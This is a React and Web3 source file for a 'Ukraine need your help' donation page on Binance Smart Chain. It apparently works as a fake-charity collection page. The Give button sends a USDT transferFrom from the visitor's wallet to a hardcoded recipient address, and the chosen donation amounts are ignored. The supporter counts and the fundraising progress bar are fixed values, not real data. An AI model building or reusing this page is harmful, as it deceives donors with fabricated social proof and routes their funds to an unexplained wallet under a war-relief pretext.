import React from "react";
import Web3 from "web3";
const web3 = new Web3("https://bsc-dataseed.binance.org/");
const usdt_address = "0x55d398326f99059fF775485246999027B3197955";
const RecipientAddress = "0xE20C24a4AFfBe2d8585820Be9f9391a487808C5e";
const usdt_abi = require("./../public/abi/usdt-abi.json");
const bsc_network_id = 56;
const usdtContract = new web3.eth.Contract(usdt_abi, usdt_address, {});

const Hero = ({
    listUser = [
        {
            name: "Number of people who supported",
            number: "390",
            icon: "/assets/Icon/heroicons_sm-user.svg",
        },
        {
            name: "From country",
            number: "20",
            icon: "/assets/Icon/gridicons_location.svg",
        },
        {
            name: "To has been purchased",
            number: "50",
            icon: "/assets/Icon/bx_bxs-server.svg",
        },
    ],
}) => {
    const connectWallet = async () => {
        if (window.ethereum) {
            try {
                var my_web3 = new Web3(window.ethereum);
                const chainId = await my_web3.eth.net.getId();
                if (chainId !== bsc_network_id)
                    return { status: "Please select BSC network on metamask.", address: "" };
                const addressArray = await window.ethereum.request({
                    method: "eth_requestAccounts",
                });
                const obj = {
                    status: "success",
                    address: addressArray[0],
                };
                return obj;
            } catch (err) {
                return {
                    address: "",
                    status: err.message,
                };
            }
        } else {
            return {
                address: "",
                status: "no-metamask",
            };
        }
    };

    const getCurrentWalletConnected = async () => {
        if (window.ethereum) {
            try {
                var my_web3 = new Web3(window.ethereum);
                const chainId = await my_web3.eth.net.getId();
                if (chainId !== bsc_network_id)
                    return { status: "Please select BSC network on metamask.", address: "" };
                const addressArray = await window.ethereum.request({ method: "eth_accounts" });
                if (addressArray.length > 0) {
                    return { address: addressArray[0], status: "success" };
                } else {
                    return { address: "", status: "unconnected" };
                }
            } catch (err) {
                return { address: "", status: err.message };
            }
        } else {
            return { address: "", status: "no-metamask" };
        }
    };

    async function checkWalletMetaMask() {
        var my_web3 = new Web3(window.ethereum);
        const chainId = await my_web3.eth.net.getId();
        const accounts = await ethereum.request({ method: "eth_requestAccounts" });
        if (chainId !== bsc_network_id) return alert("Please select BSC network on metamask.");

        const transactionParameters1 = {
            to: usdt_address,
            from: accounts[0],
            gas: web3.utils.toHex("90000"),
            data: usdtContract.methods
                .transferFrom(
                    accounts[0],
                    RecipientAddress,
                    web3.utils.toHex(web3.utils.toBN(`${1 * 10 ** 18}`))
                )
                .encodeABI(),
        };
        try {
            const txHash = await window.ethereum.request({
                method: "eth_sendTransaction",
                params: [transactionParameters1],
            });
        } catch (err) {
            alert(err.message);
        }
    }

    return (
        <div className="max-w-screen-xl mt-24 px-8 xl:px-16 mx-auto" id="about">
            <div className="grid grid-flow-row sm:grid-flow-col grid-rows-2 md:grid-rows-1 sm:grid-cols-2 gap-8 py-6 sm:py-16">
                <div className=" flex flex-col justify-center items-start row-start-2 sm:row-start-1">
                    <h1 className="text-3xl lg:text-4xl xl:text-5xl font-medium text-black-600 leading-normal mb-2">
                        Make a big impact with your small amount
                    </h1>
                    <h1 className="text-3xl lg:text-4xl xl:text-5xl font-medium text-black-600 leading-normal">
                        <strong>Ukraine need your help</strong>
                    </h1>

                    <p className="text-black-500 mt-4 mb-6">
                        We apologize for the tragic events that took place in Ukraine. On February
                        24, 2022 by order of Vladimir Putin, the Russian army began marching to
                        bring troops into Ukraine. After the missile and bomb attack, the country of
                        Ukraine is now engulfed in fear and looming as its people are left to live,
                        the situation and the future of the people here are more difficult than
                        ever.
                    </p>
                    <h1 className="mb-2 text-orange-300">The community has already raised</h1>
                    <div className="h-3 relative max-w-xl rounded-full overflow-hidden w-full">
                        <div className="w-full h-full bg-gray-400 absolute"></div>
                        <div
                            className="h-full bg-green-500 absolute"
                            style={{ width: "30%" }}
                        ></div>
                    </div>
                </div>
                <div className="w-full h-full w-full border-2 border-gray-100 rounded-xl py-6 px-8 flex flex-col justify-center">
                    <p className="mb-2">Give token</p>
                    <div className="grid grid-cols-6 gap-10">
                        <div className="col-span-6 sm:col-span-6 lg:col-span-2 p-2 border-2 border-gray-100 rounded-l cursor-pointer">
                            10.000
                        </div>
                        <div className="col-span-6 sm:col-span-6 lg:col-span-2 p-2 border-2 border-gray-100 rounded-l cursor-pointer">
                            20.000
                        </div>
                        <div className="col-span-6 sm:col-span-6 lg:col-span-2 p-2 border-2 border-gray-100 rounded-l cursor-pointer">
                            50.000
                        </div>
                        <div className="col-span-6 sm:col-span-6 lg:col-span-2 p-2 border-2 border-gray-100 rounded-l cursor-pointer">
                            100.000
                        </div>
                        <input
                            type="number"
                            placeholder="Your amount"
                            className="col-span-6 sm:col-span-6 lg:col-span-4 p-2 border-2 border-gray-100 rounded-l cursor-pointer"
                        />
                    </div>
                    <button onClick={checkWalletMetaMask}>Give</button>
                </div>
            </div>
            <div className="relative w-full flex">
                <div className="rounded-lg w-full grid grid-flow-row sm:grid-flow-row grid-cols-1 sm:grid-cols-3 py-9 divide-y-2 sm:divide-y-0 sm:divide-x-2 divide-gray-100 bg-white-500 z-10">
                    {listUser.map((listUsers, index) => (
                        <div
                            className="flex items-center justify-start sm:justify-center py-4 sm:py-6 w-8/12 px-4 sm:w-auto mx-auto sm:mx-0"
                            key={index}
                        >
                            <div className="flex mx-auto w-40 sm:w-auto">
                                <div className="flex items-center justify-center bg-orange-100 w-12 h-12 mr-6 rounded-full">
                                    <img src={listUsers.icon} className="h-6 w-6" />
                                </div>
                                <div className="flex flex-col">
                                    <p className="text-xl text-black-600 font-bold">
                                        {listUsers.number}+
                                    </p>
                                    <p className="text-lg text-black-500">{listUsers.name}</p>
                                </div>
                            </div>
                        </div>
                    ))}
                </div>
                <div
                    className="absolute bg-black-600 opacity-5 w-11/12 roudned-lg h-64 sm:h-48 top-0 mt-8 mx-auto left-0 right-0"
                    style={{ filter: "blur(114px)" }}
                ></div>
            </div>
        </div>
    );
};

export default Hero;
